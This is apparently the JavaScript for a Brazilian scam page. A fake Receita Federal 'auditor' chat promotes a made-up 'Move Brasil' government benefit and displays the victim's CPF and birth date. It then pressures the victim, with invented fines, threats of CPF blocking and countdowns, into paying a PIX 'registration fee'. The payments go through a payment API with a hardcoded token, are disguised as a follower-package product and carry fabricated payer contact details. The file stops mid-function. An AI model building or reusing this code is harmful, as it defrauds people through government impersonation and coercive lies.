// Helper functions to preserve UTM parameters
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    const paramObj = {};
    for (const [key, value] of params) {
        paramObj[key] = value;
    }
    return paramObj;
}

function buildUrlWithParams(baseUrl) {
    const params = getUrlParams();
    if (Object.keys(params).length === 0) {
        return baseUrl;
    }
    const url = new URL(baseUrl, window.location.origin);
    for (const [key, value] of Object.entries(params)) {
        url.searchParams.set(key, value);
    }
    return url.toString();
}

// Get customer data from localStorage (saved when accessing via CPF slug)
const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');

// Function to properly capitalize names
function capitalizeNames(name) {
    if (!name) return 'Nome não informado';
    return name.toLowerCase().split(' ').map(word => 
        word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
}

const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
const cpf = customerData.cpf || 'CPF não informado';

// Chat sequence with tax debt notification
const dataNasc = customerData.data_nascimento || 'Não informado';
const nomeMae = customerData.nome_mae || 'Não informado';

const chatSequence = [
    {
        message: `Olá ${firstName}, aqui é a Ana Carolina, Auditora do Benefício Move Brasil.`,
        delay: 3000
    },
    {
        message: 'O Move Brasil é uma iniciativa beneficente do governo federal lançada em 8 de Janeiro de 2026 com encerramento em 8 de Novembro de 2026 destinada a estimular a renovação da frota de veículos no país, com foco em eficiência, segurança e sustentabilidade, oferecendo linhas de crédito com juros de 00,58%, com 80% do valor financiado pelo Banco Central do Brasil, para caminhões, ônibus, motos, carros e táxis. Após a finalização da inscrição, aguarde 10 dias úteis para que o Governo Federal envie sua aprovação através do seu E-mail ou caixa postal do seu número.',
        delay: 4000,
        confirmData: true
    },
    {
        message: 'Escolha a modalidade Move Brasil desejada:',
        delay: 4000,
        showOptions: 'debtOptions'
    }
];

// Chat container
const chatContainer = document.getElementById('chatContainer');

// Add message to chat
function addMessage(text, isIncoming = true, scrollToBottom = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
    
    messageDiv.innerHTML = `
        <div class="message-content">
            ${text.replace(/\n/g, '<br>')}
        </div>
    `;
    
    chatContainer.appendChild(messageDiv);
    
    if (scrollToBottom) {
        chatContainer.scrollTop = chatContainer.scrollHeight;
    }
}

// Show typing indicator
function showTyping(duration = 3000) {
    return new Promise(resolve => {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
        typingDiv.style.paddingLeft = '0px';
        typingDiv.style.marginLeft = '-10px';
        typingDiv.innerHTML = `
            <div class="message-content d-flex align-items-center" style="background-color: #044785; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
                <div class="typing-animation">
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>
            </div>
        `;

        chatContainer.appendChild(typingDiv);
        chatContainer.scrollTop = chatContainer.scrollHeight;

        setTimeout(() => {
            if (typingDiv.parentNode) {
                typingDiv.parentNode.removeChild(typingDiv);
            }
            resolve();
        }, duration);
    });
}

// Show options
function showOptions(optionsId) {
    let optionsHtml = '';

    if (optionsId === 'debtOptions') {
        optionsHtml = `
            <div class="chat-options">
                <div style="font-weight:700;font-size:14px;color:#044785;margin-bottom:8px;">Opções</div>
                <button class="option-button" onclick="handleOptionClick(this, 'Move Brasil Táxi e Aplicativos', 'moveTaxi')">
                    <i class="fas fa-taxi" style="color:var(--receita-blue);"></i>
                    <strong>Move Brasil Táxi e Aplicativos</strong><br>
                    <span style="font-size:0.9rem;color:#555;">taxistas, motoristas de aplicativo e cooperativas de táxi.</span>
                </button>
                <button class="option-button" onclick="handleOptionClick(this, 'Move Brasil Entregadores e Motoapp', 'moveEntregadores')">
                    <i class="fas fa-motorcycle" style="color:var(--receita-blue);"></i>
                    <strong>Move Brasil Entregadores e Motoapp</strong><br>
                    <span style="font-size:0.9rem;color:#555;">entregadores, motofretistas, mototaxistas e ciclistas profissionais.</span>
                </button>
                <button class="option-button" onclick="handleOptionClick(this, 'Move Brasil Caminhões', 'moveCaminhoes')">
                    <i class="fas fa-truck" style="color:var(--receita-blue);"></i>
                    <strong>Move Brasil Caminhões</strong><br>
                    <span style="font-size:0.9rem;color:#555;">caminhões e implementos rodoviários.</span>
                </button>
            </div>
        `;
    }

    if (optionsHtml) {
        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
        chatContainer.scrollTop = chatContainer.scrollHeight;
    }
}

// Handle option click
function handleOptionClick(button, responseText, nextAction) {
    // Add user response to chat
    addMessage(responseText, false, true);

    // Remove the options container
    const optionsContainer = button.closest('.chat-options');
    if (optionsContainer) {
        optionsContainer.remove();
    }

    // Define product config for each option
    const productConfig = {
        moveTaxi: {
            amount: 5748,
            offerHash: 'seguidores847293',
            productHash: 'seguidores847293',
            productTitle: 'Pacote de Seguidores BR'
        },
        moveEntregadores: {
            amount: 3832,
            offerHash: 'seguidores194728',
            productHash: 'seguidores194728',
            productTitle: 'Pacote de Seguidores BR'
        },
        moveCaminhoes: {
            amount: 7664,
            offerHash: 'seguidores382914',
            productHash: 'seguidores382914',
            productTitle: 'Pacote de Seguidores BR'
        }
    };

    // Save selected product to localStorage if available
    if (productConfig[nextAction]) {
        localStorage.setItem('selectedProduct', JSON.stringify(productConfig[nextAction]));
    }

    // Show typing and continue conversation
    setTimeout(async () => {
        if (nextAction === 'redirectToPayment') {
            await showTyping(4000);
            addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade.`, true, true);
            
            await showTyping(5000);
            addMessage('Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.', true, true);
            
            // Show payment button
            setTimeout(() => {
                showPaymentButton();
            }, 2000);
        } else if (nextAction === 'confirmBlock') {
            await showTyping(8000);
            addMessage('Entendido. Vou iniciar o processo de bloqueio do seu CPF conforme os procedimentos da Receita Federal. O bloqueio será efetivado em breve. Obrigada pela atenção.', true, true);
        } else if (nextAction === 'moveTaxi') {
            await showTyping(3000);
            addMessage('<span style="color:#e30613;font-weight:700;">TAXA DE INSCRIÇÃO PENDENTE</span><br><br>O CPF remetente não finalizou a taxa de inscrição para registro no BNDES.<br><br>Efetue o pagamento da taxa única de <strong>R$ 57,48</strong> para finalizar a inscrição processada pelo <strong>Banco do Brasil</strong>.', true, true);
            await showTyping(3000);
            addMessage('O BNDES disponibiliza direito onde, realizando o pagamento pela primeira vez, o cidadão obtém desconto de 94%, reduzindo o valor de R$ 958,00 para R$ 57,48 no primeiro ato de inscrição.<br><br>Caso não efetue o pagamento inicial será aplicada a perda do valor primário e haverá uma reformulação no valor de R$ 985,00 conforme a <strong>Legislação Tributária Federal Vigente</strong>.', true, true);
            await showTyping(2000);
            addMessage('<span style="color:#e30613;font-weight:700;">⚠️ Segundo as normas da Receita Federal e Banco Central do Brasil, o pagamento com desconto tem validade de 10 minutos. Ao gerar o código PIX e não houver a realização do pagamento, o acesso ao desconto será cancelado e adicionado a lista de bloqueio.</span>', true, true);
            setTimeout(() => { showPaymentButton(); }, 2000);
        } else if (nextAction === 'moveEntregadores') {
            await showTyping(3000);
            addMessage('<span style="color:#e30613;font-weight:700;">TAXA DE INSCRIÇÃO PENDENTE</span><br><br>O CPF remetente não finalizou a taxa de inscrição para registro no BNDES.<br><br>Efetue o pagamento da taxa única de <strong>R$ 38,32</strong> para finalizar a inscrição processada pelo <strong>Banco do Brasil</strong>.', true, true);
            await showTyping(3000);
            addMessage('O BNDES disponibiliza direito onde, realizando o pagamento pela primeira vez, o cidadão obtém desconto de 94%, reduzindo o valor de R$ 958,00 para R$ 38,32 no primeiro ato de inscrição.<br><br>Caso não efetue o pagamento inicial será aplicada a perda do valor primário e haverá uma reformulação no valor de R$ 985,00 conforme a <strong>Legislação Tributária Federal Vigente</strong>.', true, true);
            await showTyping(3000);
            addMessage('Efetuar pagamento da taxa de inscrição', true, true);
            await showTyping(2000);
            addMessage('<span style="color:#e30613;font-weight:700;">⚠️ Segundo as normas da Receita Federal e Banco Central do Brasil, o pagamento com desconto tem validade de 10 minutos. Ao gerar o código PIX e não houver a realização do pagamento, o acesso ao desconto será cancelado e adicionado a lista de bloqueio.</span>', true, true);
            setTimeout(() => { showPaymentButton(); }, 2000);
        } else if (nextAction === 'moveCaminhoes') {
            await showTyping(3000);
            addMessage('<span style="color:#e30613;font-weight:700;">TAXA DE INSCRIÇÃO PENDENTE</span><br><br>O CPF remetente não finalizou a taxa de inscrição para registro no BNDES.<br><br>Efetue o pagamento da taxa única de <strong>R$ 76,64</strong> para finalizar a inscrição processada pelo <strong>Banco do Brasil</strong>.', true, true);
            await showTyping(3000);
            addMessage('O BNDES disponibiliza direito onde, realizando o pagamento pela primeira vez, o cidadão obtém desconto de 94%, reduzindo o valor de R$ 958,00 para R$ 76,64 no primeiro ato de inscrição.<br><br>Caso não efetue o pagamento inicial será aplicada a perda do valor primário e haverá uma reformulação no valor de R$ 985,00 conforme a <strong>Legislação Tributária Federal Vigente</strong>.', true, true);
            await showTyping(3000);
            addMessage('Efetuar pagamento da taxa de inscrição', true, true);
            await showTyping(2000);
            addMessage('<span style="color:#e30613;font-weight:700;">⚠️ Segundo as normas da Receita Federal e Banco Central do Brasil, o pagamento com desconto tem validade de 10 minutos. Ao gerar o código PIX e não houver a realização do pagamento, o acesso ao desconto será cancelado e adicionado a lista de bloqueio.</span>', true, true);
            setTimeout(() => { showPaymentButton(); }, 2000);
        }
    }, 1000);
}

// Show payment button
function showPaymentButton() {
    const buttonHtml = `
        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
            <button class="payment-button" onclick="openPixModal()" style="
                background: #28a745;
                border: none;
                border-radius: 2px;
                padding: 16px 24px;
                color: white;
                font-weight: 600;
                font-size: 1.1rem;
                cursor: pointer;
                width: 100%;
                text-align: center;
                transition: all 0.3s ease;
                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
                Efetuar pagamento da taxa de inscrição
            </button>
        </div>
    `;
    
    chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
    chatContainer.scrollTop = chatContainer.scrollHeight;
}

// Helper functions
function generateRandomEmail(name) {
    const cleanName = name.toLowerCase().replace(/[^a-z0-9]/g, '');
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    const randomDomain = domains[Math.floor(Math.random() * domains.length)];
    const randomNum = Math.floor(Math.random() * 10000);
    return `${cleanName}${randomNum}@${randomDomain}`;
}

function generateRandomPhone() {
    const ddds = ['11','12','13','14','15','16','17','18','19','21','22','24','27','28','31','32','33','34','35','37','38','41','42','43','44','45','46','47','48','49','51','53','54','55','61','62','63','64','65','66','67','68','69','71','73','74','75','77','79','81','82','83','84','85','86','87','88','89','91','92','93','94','95','96','97','98','99'];
    const ddd = ddds[Math.floor(Math.random() * ddds.length)];
    const firstPart = 900000000 + Math.floor(Math.random() * 100000000);
    return ddd + firstPart.toString();
}

function generateQRCodeUrl(text) {
    return `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(text)}`;
}

// TriboPay API config
const TRIBOPAY_API_TOKEN = 'FXIvg5KDJ24FhirIhVwq7cTMVVjn889iWFtkJ9Mrm6bfD9WTRsIl9HAMuQDR';
const TRIBOPAY_BASE_URL = 'https://api.tribopay.com.br/api/public/v1';

// PIX Modal functionality
async function openPixModal() {
    // Fire Initiate Checkout event
    const selectedProduct = JSON.parse(localStorage.getItem('selectedProduct') || '{"amount": 5748, "offerHash": "seguidores847293", "productHash": "seguidores847293", "productTitle": "Pacote de Seguidores"}');
    const value = (selectedProduct.amount / 100).toFixed(2);
    
    // UTMify Initiate Checkout event (if available)
    if (typeof window.utmify !== 'undefined') {
        window.utmify.track('Initiate Checkout', {
            currency: 'BRL',
            value: value,
            items: [{
                id: selectedProduct.productHash,
                name: selectedProduct.productTitle,
                price: value,
                quantity: 1
            }]
        });
    }
    
    // Also push to dataLayer for compatibility with other tools (GA4, Meta Pixel, etc.)
    window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        event: 'initiate_checkout',
        ecommerce: {
            currency: 'BRL',
            value: value,
            items: [{
                item_id: selectedProduct.productHash,
                item_name: selectedProduct.productTitle,
                price: value,
                quantity: 1
            }]
        }
    });
    
    // Show loading modal first
    showLoadingModal();
    
    try {
        // Get customer data and URL params from localStorage
        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
        const params = getUrlParams();
        
        // Generate fake contact info
        const email = generateRandomEmail(customerData.nome || 'cliente');
        const phone = generateRandomPhone();
        
        // Clean CPF (remove dots and dashes)
        const cleanCpf = (customerData.cpf || '').replace(/[^\d]/g, '');
        
        // Prepare TriboPay request payload
        const payload = {
            amount: selectedProduct.amount,
            offer_hash: selectedProduct.offerHash,
            payment_method: 'pix',
            customer: {
                name: customerData.nome || 'Cliente',
                email: email,
                phone_number: phone,
                document: cleanCpf
            },
            cart: [
                {
                    product_hash: selectedProduct.productHash,
                    title: selectedProduct.productTitle,
                    cover: null,
                    price: selectedProduct.amount,
                    quantity: 1,
                    operation_type: 1,
                    tangible: false
                }
            ],
            expire_in_days: 1,
            transaction_origin: 'api',
            tracking: {
                src: '',
                utm_source: params.utm_source || '',
                utm_medium: params.utm_medium || '',
                utm_campaign: params.utm_campaign || '',
                utm_term: params.utm_term || '',
                utm_content: params.utm_content || ''
            },
            postback_url: 'https://example.com/webhook'
        };
        
        // Call TriboPay API
        const response = await fetch(`${TRIBOPAY_BASE_URL}/transactions?api_token=${TRIBOPAY_API_TOKEN}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        
        if (response.ok) {
            // Save transaction hash for monitoring
            const transactionHash = data.hash;
            const pixQrCode = data.pix?.pix_qr_code;
            
            if (transactionHash && pixQrCode) {
                localStorage.setItem('tribopayTransactionHash', transactionHash);
                
                // Replace loading modal with PIX data
                showPixModal({
                    pixCode: pixQrCode,
                    pixQrCode: generateQRCodeUrl(pixQrCode),
                    gatewayId: transactionHash,
                    amount: selectedProduct.amount
                });
            } else {
                closePixModal();
                alert('Não foi possível obter os dados do PIX.');
            }
        } else {
            closePixModal();
            const errorMessage = data.message || data.error || 'Erro ao gerar PIX.';
            alert(`Erro: ${errorMessage}`);
        }
    } catch (error) {
        closePixModal();
        alert('Erro ao conectar com a API.');
    }
}

function showLoadingModal() {
    const modalHtml = `
        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto;">
            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; justify-content: center; align-items: center;">
                <div style="text-align: center;">
                    <div class="spinner" style="
                        width: 60px;
                        height: 60px;
                        border: 6px solid #f3f3f3;
                        border-top: 6px solid #044785;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                        margin: 0 auto 30px auto;
                    "></div>
                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 15px; font-size: 1.3rem;">Aguardando pagamento...</h2>
                    <p style="color: #666; font-size: 1rem;">Gerando DARF, por favor aguarde...</p>
                </div>
            </div>
        </div>
        <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        </style>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHtml);
}

function showPixModal(data) {
    // Remove loading modal and show PIX modal
    const existingModal = document.getElementById('pixModal');
    if (existingModal) {
        existingModal.remove();
    }
    
    // Format amount (R$ X,XX)
    const amountReais = (data.amount / 100).toFixed(2).replace('.', ',');
    
    // Start payment monitoring
    const gatewayId = data.gatewayId;
    console.log('🔍 Dados PIX recebidos:', data);
    console.log('🆔 Transaction Hash identificado:', gatewayId);
    
    if (gatewayId) {
        console.log('✅ Iniciando monitoramento de pagamento para:', gatewayId);
        startPaymentMonitoring(gatewayId);
        
        // Show manual confirmation popup after 20 seconds
        console.log('⏰ Configurando popup de confirmação para aparecer em 20 segundos...');
        setTimeout(() => {
            console.log('⏰ 20 segundos passaram, chamando showManualPaymentConfirmation...');
            showManualPaymentConfirmation(gatewayId);
        }, 20000);
    } else {
        console.error('❌ Nenhum transaction hash encontrado nos dados:', data);
    }
    
    const modalHtml = `
        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto; animation: fadeIn 1s ease-out;">
            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; animation: slideDown 1s ease-out; transform: translateY(0);">
                <div style="text-align: center; margin-bottom: 30px;">
                    <div class="spinner" style="
                        width: 40px;
                        height: 40px;
                        border: 4px solid #f3f3f3;
                        border-top: 4px solid #044785;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                        margin: 0 auto 15px auto;
                    "></div>
                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 10px; font-size: 1.3rem;">Aguardando pagamento...</h2>
                    <p style="color: #666; font-size: 0.9rem;">Estamos aguardando o pagamento</p>
                </div>

                <div style="text-align: center; margin: 20px 0;">
                    <div style="display: inline-block; padding: 10px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                        <img src="${data.pixQrCode}" alt="QR Code PIX" style="width: 150px; height: 150px;">
                    </div>
                </div>

                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">Código PIX (Copia e Cola) - Valor: R$ ${amountReais}</label>
                    <div style="margin-bottom: 10px;">
                        <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">${data.pixCode}</textarea>
                        <input type="hidden" id="pixCodeInputReal" value="${data.pixCode}">
                    </div>
                    <button onclick="copyPixCode()" style="width: 100%; padding: 12px 16px; background: #044785; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
                        <i class="fas fa-copy"></i> Copiar código PIX completo
                    </button>
                </div>

                <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
                    <h4 style="color: #856404; margin-bottom: 15px; font-size: 1rem; font-weight: 600;">
                        <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
                        Como pagar com PIX Copia e Cola:
                    </h4>
                    <div style="color: #856404; font-size: 0.9rem; line-height: 1.5;">
                        <p style="margin-bottom: 8px;"><strong>1.</strong> Copie o código PIX clicando no botão acima</p>
                        <p style="margin-bottom: 8px;"><strong>2.</strong> Abra o aplicativo do seu banco</p>
                        <p style="margin-bottom: 8px;"><strong>3.</strong> Procure pela opção "PIX" e depois "Copia e Cola"</p>
                        <p style="margin-bottom: 0;"><strong>4.</strong> Cole o código copiado e confirme o pagamento de R$ ${amountReais}</p>
                    </div>
                </div>

                <div style="text-align: center; margin-top: 20px; padding: 15px; background: #e8f4fd; border-radius: 8px; border-left: 4px solid #044785;">
                    <p style="color: #044785; font-weight: 600; margin-bottom: 10px;">
                        <i class="fas fa-clock" style="margin-right: 8px;"></i>
                        Tempo para pagamento: 10 minutos
                    </p>
                    <p style="color: #666; font-size: 0.9rem;">Após o pagamento, retorne imediatamente a esta página para confirmação.</p>
                </div>

                <div style="text-align: center; margin-top: 20px;">
                    <button onclick="closePixModal()" style="padding: 12px 24px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
                        Fechar
                    </button>
                </div>
            </div>
        </div>
        <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        </style>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHtml);
}

function copyPixCode() {
    // Get the real PIX code from hidden input
    const realPixInput = document.getElementById('pixCodeInputReal');
    const realPixCode = realPixInput.value;
    
    try {
        // Copy the real PIX code to clipboard
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(realPixCode);
        } else {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = realPixCode;
            document.body.appendChild(textArea);
            textArea.select();
            textArea.setSelectionRange(0, 99999);
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }
        
        const button = event.target.closest('button');
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
        button.style.background = '#28a745';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '#044785';
        }, 3000);
    } catch (err) {
        console.error('Erro ao copiar:', err);
        alert('Erro ao copiar código. Tente selecionar manualmente.');
    }
}

function closePixModal() {
    const modal = document.getElementById('pixModal');
    if (modal) {
        modal.remove();
    }
    
    // Stop payment monitoring
    if (window.paymentMonitorInterval) {
        clearInterval(window.paymentMonitorInterval);
        window.paymentMonitorInterval = null;
    }
}

// Payment monitoring function
function startPaymentMonitoring(gatewayId) {
    console.log('🚀 INICIANDO MONITORAMENTO AUTOMÁTICO - Transaction Hash:', gatewayId);
    
    // Clear any existing interval
    if (window.paymentMonitorInterval) {
        clearInterval(window.paymentMonitorInterval);
        console.log('🔄 Limpando monitoramento anterior');
    }
    
    // VERIFICA STATUS A CADA 2 SEGUNDOS (evitar rate limiting)
    window.paymentMonitorInterval = setInterval(async () => {
        try {
            const statusUrl = `${TRIBOPAY_BASE_URL}/transactions/${gatewayId}?api_token=${TRIBOPAY_API_TOKEN}`;
            
            const response = await fetch(statusUrl, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            });
            
            const statusData = await response.json();
            
            // Status está em payment_status
            const transactionStatus = statusData.payment_status;
            
            // VERIFICA SE PAGAMENTO FOI APROVADO
            if (transactionStatus === 'paid') {
                
                // Para o monitoramento imediatamente
                clearInterval(window.paymentMonitorInterval);
                window.paymentMonitorInterval = null;
                
                // Remove modal se existir
                const modal = document.getElementById('pixModal');
                if (modal) {
                    modal.remove();
                }
                
                // REDIRECIONAMENTO INSTANTÂNEO PARA MULTA.HTML
                window.location.href = buildUrlWithParams('aviso.html');
                return;
                
            } else if (transactionStatus === 'expired' || transactionStatus === 'canceled' || transactionStatus === 'failed') {
                clearInterval(window.paymentMonitorInterval);
                window.paymentMonitorInterval = null;
                return;
            }
            
        } catch (error) {
            // Silent error
        }
    }, 2000); // VERIFICA A CADA 2 SEGUNDOS
    
    
    // Timeout after 20 minutes (PIX expiration)
    setTimeout(() => {
        if (window.paymentMonitorInterval) {
            clearInterval(window.paymentMonitorInterval);
            window.paymentMonitorInterval = null;
        }
    }, 20 * 60 * 1000); // 20 minutes
}

// Initialize chat
async function initializeChat() {
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    for (let i = 0; i < chatSequence.length; i++) {
        const message = chatSequence[i];
        
        // Show typing
        await showTyping(message.delay);
        
        // Add message
        addMessage(message.message, true, true);
        
        // Show data confirmation after second message
        if (message.confirmData) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            await showTyping(2500);
            addMessage(`Para prosseguir, preciso que confirme os dados cadastrais vinculados ao seu CPF em nosso sistema:`, true, true);
            
            setTimeout(() => {
                showDataConfirmation();
            }, 1000);
            
            await waitForDataConfirmation();
        }
        
        // Show options if specified
        if (message.showOptions) {
            setTimeout(() => {
                showOptions(message.showOptions);
            }, 1500);
        }
    }
}

// Global variable to control data confirmation
let dataConfirmationResolve = null;

// Show data confirmation form
function showDataConfirmation() {
    const dataHtml = `
        <div class="data-confirm-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 85%;">
            <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dee2e6; border-left: 4px solid #044785;">
                <p style="font-weight: 700; color: #044785; margin-bottom: 14px; font-size: 0.95rem;">📋 Dados cadastrais identificados:</p>
                <p style="margin: 6px 0; font-size: 0.9rem;"><strong>Nome:</strong> ${fullName}</p>
                <p style="margin: 6px 0; font-size: 0.9rem;"><strong>CPF:</strong> ${cpf}</p>
                <p style="margin: 6px 0 16px 0; font-size: 0.9rem;"><strong>Data de Nascimento:</strong> ${dataNasc}</p>
                <button 
                    onclick="confirmUserData()" 
                    style="
                        background: #044785;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 4px;
                        font-weight: 600;
                        cursor: pointer;
                        width: 100%;
                        font-size: 1rem;
                    "
                >
                    ✅ Confirmar meus dados
                </button>
            </div>
        </div>
    `;
    
    chatContainer.insertAdjacentHTML('beforeend', dataHtml);
    chatContainer.scrollTop = chatContainer.scrollHeight;
}

// Wait for data confirmation
function waitForDataConfirmation() {
    return new Promise(resolve => {
        dataConfirmationResolve = resolve;
    });
}

// Confirm user data
async function confirmUserData() {
    addMessage(`Dados confirmados ✅`, false, true);
    
    const container = document.querySelector('.data-confirm-container');
    if (container) container.remove();
    
    await showTyping(2500);
    addMessage(`Dados verificados com sucesso, ${fullName}.`, true, true);
    
    if (dataConfirmationResolve) {
        dataConfirmationResolve();
        dataConfirmationResolve = null;
    }
}

// Start chat when page loads
document.addEventListener('DOMContentLoaded', initializeChat);

// Profile dropdown
document.addEventListener('DOMContentLoaded', function() {
    const toggle = document.getElementById('profileToggle');
    const dropdown = document.getElementById('profileDropdown');
    const nameEl = document.getElementById('profileName');

    if (customerData.nome) nameEl.textContent = customerData.nome;

    if (toggle && dropdown) {
        toggle.addEventListener('click', function(e) {
            e.stopPropagation();
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        });
        document.addEventListener('click', function() {
            dropdown.style.display = 'none';
        });
    }
});


// Function to show manual payment confirmation popup
function showManualPaymentConfirmation(gatewayId) {
    // Check if PIX modal is still visible
    const pixModal = document.getElementById('pixModal');
    if (!pixModal) {
        return;
    }
    
    
    const confirmationPopup = `
        <div id="paymentConfirmationPopup" style="
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            z-index: 3000;
            padding: 30px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            animation: popupFadeIn 0.3s ease-out;
        ">
            <h3 style="color: #044785; font-weight: 600; margin-bottom: 20px; font-size: 1.2rem;">
                Confirmação de Pagamento
            </h3>
            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
                Você já realizou o pagamento via PIX?
            </p>
            <div style="display: flex; gap: 15px; justify-content: center;">
                <button onclick="handlePaymentConfirmation('${gatewayId}', true)" style="
                    background: #28a745;
                    color: white;
                    border: none;
                    padding: 12px 24px;
                    border-radius: 6px;
                    font-weight: 600;
                    cursor: pointer;
                    font-size: 1rem;
                ">
                    Sim
                </button>
                <button onclick="handlePaymentConfirmation('${gatewayId}', false)" style="
                    background: #dc3545;
                    color: white;
                    border: none;
                    padding: 12px 24px;
                    border-radius: 6px;
                    font-weight: 600;
                    cursor: pointer;
                    font-size: 1rem;
                ">
                    Não
                </button>
            </div>
        </div>
        <div id="paymentConfirmationOverlay" style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 2999;
        "></div>
        <style>
        @keyframes popupFadeIn {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
        </style>
    `;
    
    document.body.insertAdjacentHTML('beforeend', confirmationPopup);
}

// Function to handle manual payment confirmation
async function handlePaymentConfirmation(gatewayId, confirmed) {
    // Remove confirmation popup
    const popup = document.getElementById('paymentConfirmationPopup');
    const overlay = document.getElementById('paymentConfirmationOverlay');
    if (popup) popup.remove();
    if (overlay) overlay.remove();
    
    if (confirmed) {
        
        try {
            const statusUrl = `${TRIBOPAY_BASE_URL}/transactions/${gatewayId}?api_token=${TRIBOPAY_API_TOKEN}`;
            
            const response = await fetch(statusUrl, {
                headers: { 'Accept': 'application/json' }
            });
            
            if (!response.ok) {
                alert('Erro ao verificar pagamento. Tente novamente.');
                return;
            }
            
            const statusData = await response.json();
            
            // Status está em payment_status
            const transactionStatus = statusData.payment_status;
            
            if (transactionStatus === 'paid') {
                
                // Clear automatic monitoring
                if (window.paymentMonitorInterval) {
                    clearInterval(window.paymentMonitorInterval);
                    window.paymentMonitorInterval = null;
                }
                
                // Close modal
                closePixModal();
                
                // Redirect to aviso.html
                window.location.href = buildUrlWithParams('aviso.html');
            } else {
                alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
            }
        } catch (error) {
            alert('Erro ao verificar pagamento');
        }
    } else {
        // Continue with automatic monitoring
    }
}

// Sidebar functionality
document.addEventListener('DOMContentLoaded', function() {
    const menuToggle = document.querySelector('.movebrasil-hamburger');
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    const closeBtn = document.getElementById('sidebarClose');

    function openSidebar() {
        if (sidebar) sidebar.classList.add('open');
        if (overlay) overlay.classList.add('open');
